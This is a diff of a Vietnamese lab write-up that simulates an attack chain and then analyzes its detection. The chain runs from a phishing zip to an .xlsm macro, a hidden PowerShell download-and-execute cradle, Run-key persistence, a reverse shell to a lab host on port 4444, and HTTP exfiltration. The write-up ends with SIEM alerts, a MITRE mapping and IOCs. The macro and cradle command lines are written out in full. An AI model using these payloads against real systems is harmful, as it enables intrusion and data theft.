@@ -9,18 +9,18 @@ layout: post
 ---
 ## Attack Chain
 
-![image](assets/images4/17.png)
+![image](/assets/images4/17.png)
 
 ### Chi tiết:
 
 #### 1. Email Phishing
 
 - Attacker gửi email `zip` tới victim
-![image](assets/images4/1.png)
+![image](/assets/images4/1.png)
 
 - Giải nén nhận được 1 file `.xlsm`
 
-![image](assets/images4/2.png)
+![image](/assets/images4/2.png)
 
 
 #### 2. Thực thi Macro VBA
@@ -30,14 +30,14 @@ layout: post
 ```
 Private Sub Workbook_Open()
     Dim cmd As String
-    cmd = "powershell -w hidden -nop -c ""Invoke-WebRequest 'http://192.168.200.132:8000/Test.ps1' -OutFile $env:TEMP\payload.ps1; powershell -ep bypass -f $env:TEMP\payload.ps1"""
+    cmd = "powershell -w hidden -nop -c ""Invoke-WebRequest 'http:/192.168.200.132:8000/Test.ps1' -OutFile $env:TEMP\payload.ps1; powershell -ep bypass -f $env:TEMP\payload.ps1"""
     Shell cmd, vbHide
 End Sub
 ```
 
 - Thực hiện tải file độc hại `Test.ps1` từ máy `Kali`, lưu vào thư mục `TEMP` với tên là `payload.ps1` và tiến hành thực thi script
 
-![image](assets/images4/3.png)
+![image](/assets/images4/3.png)
 
 
 - Nội dung `Test.ps1`
@@ -69,7 +69,7 @@ while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
 $client.Close()
 ```
 - Thiết lập `persistence` đồng thời `reverse shell` về máy chủ `Kali`
-![image](assets/images4/4.png)
+![image](/assets/images4/4.png)
 
 #### 3. Data Exfiltration
 
@@ -95,10 +95,10 @@ if __name__ == "__main__":
     server.serve_forever()
 ```
 
-![image](assets/images4/5.png)
+![image](/assets/images4/5.png)
 
 - Trích xuất thành công
-![image](assets/images4/6.png)
+![image](/assets/images4/6.png)
 
 ### Tóm tắt diễn biến
 
@@ -188,7 +188,7 @@ Reverse Shell
 
 ### Executive Summary
 
-- Tải một PowerShell payload từ `http://192.168.200.132:8000/Test.ps1` và ghi xuống `C:\Users\noname\AppData\Local\Temp\payload.ps1`.
+- Tải một PowerShell payload từ `http:/192.168.200.132:8000/Test.ps1` và ghi xuống `C:\Users\noname\AppData\Local\Temp\payload.ps1`.
 - Thực thi payload với -ep bypass.
 - Cài `persistence` qua `Run key: OfficeUpdate`.
 - Thiết lập reverse shell `TCP` tới `192.168.200.132:4444`.
@@ -202,8 +202,8 @@ Reverse Shell
 - Event ID: `4103 - PowerShell Operational`
 - Rule ID: `100206`
 - Rule description: `Invoke Webrequest executed, possible download cradle detected.`
-- Detail: `Command Invocation: Invoke-WebRequest`: `http://192.168.200.132:8000/Test.ps1' -OutFile $env:TEMP\payload.ps1; powershell -ep bypass -f $env:TEMP\payload.ps1`
-![image](assets/images4/7.png)
+- Detail: `Command Invocation: Invoke-WebRequest`: `http:/192.168.200.132:8000/Test.ps1' -OutFile $env:TEMP\payload.ps1; powershell -ep bypass -f $env:TEMP\payload.ps1`
+![image](/assets/images4/7.png)
 
 #### 2. Aug 14, 2025 - 15:56:58.884
 
@@ -212,7 +212,7 @@ Reverse Shell
 - Rule description: `Executable file dropped in folder commonly used by malware`
 - Rule level : `15`
 - Detail: `File created`: `C:\Users\noname\AppData\Local\Temp\payload.ps1`
-![image](assets/images4/8.png)
+![image](/assets/images4/8.png)
 
 #### 3. Aug 14, 2025 - 15:56:58.885
 
@@ -221,7 +221,7 @@ Reverse Shell
 - Rule description: `Powershell executed script from suspicious location`
 - Rule level : `15`
 - Detail: `Process Create`: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ep bypass -f C:\Users\noname\AppData\Local\Temp\payload.ps1`
-![image](assets/images4/9.png)
+![image](/assets/images4/9.png)
 
 #### 4. Aug 14, 2025 - 15:56:58.915
 
@@ -230,7 +230,7 @@ Reverse Shell
 - Rule description: `Registry entry to be executed on next logon was modified using command line application`
 - Rule level : `15`
 - Detail: `Registry value set`: `HKU\S-1-5-...\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\OfficeUpdate`
-![image](assets/images4/10.png)
+![image](/assets/images4/10.png)
 
 #### 5. Aug 14, 2025 - 15:56:58.995
 
@@ -239,7 +239,7 @@ Reverse Shell
 - Rule description: `Powershell created a new TCPClient - possible reverse shell.`
 - Rule level : `15`
 - Detail: `Reverse Shell`: `TCPClient('192.168.200.132',4444)`
-![image](assets/images4/11.png)
+![image](/assets/images4/11.png)
 
 #### 6. Aug 14, 2025 - 15:57:47.948
 
@@ -248,10 +248,10 @@ Reverse Shell
 - Rule description: `Invoke Webrequest executed, possible download cradle detected.`
 - Rule level : `15`
 - Detail: `Data Exfiltration`
-![image](assets/images4/12.png)
+![image](/assets/images4/12.png)
 ## MITRE ATT&CK
 
-![image](assets/images4/13.png)
+![image](/assets/images4/13.png)
 
 #### Chi tiết:
 
@@ -270,8 +270,8 @@ Reverse Shell
 
 - IP (attacker): 192.168.200.132
 - Ports: HTTP 8000 (ingress/tool transfer & exfil), TCP 4444 (reverse shell)
-- URL: http://192.168.200.132:8 000/Test.ps1
-- HTTP POST target: http://192.168.200.132:8000/ (exfil via POST)
+- URL: http:/192.168.200.132:8 000/Test.ps1
+- HTTP POST target: http:/192.168.200.132:8000/ (exfil via POST)
 
 #### Host / Files
 
@@ -288,7 +288,7 @@ Reverse Shell
 
 #### Processes / Commandlines
 - C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -f C:\Users\...\AppData\Local\Temp\payload.ps1
-- Macro command: powershell -w hidden -nop -c "Invoke-WebRequest 'http://192.168.200.132:8000/Test.ps1' -OutFile $env:TEMP\payload.ps1; powershell -ep bypass -f $env:TEMP\payload.ps1"
+- Macro command: powershell -w hidden -nop -c "Invoke-WebRequest 'http:/192.168.200.132:8000/Test.ps1' -OutFile $env:TEMP\payload.ps1; powershell -ep bypass -f $env:TEMP\payload.ps1"
 - Powershell code pattern: New-Object System.Net.Sockets.TCPClient('192.168.200.132',4444) or TCPClient(
 
 #### Timestamps (from your logs)
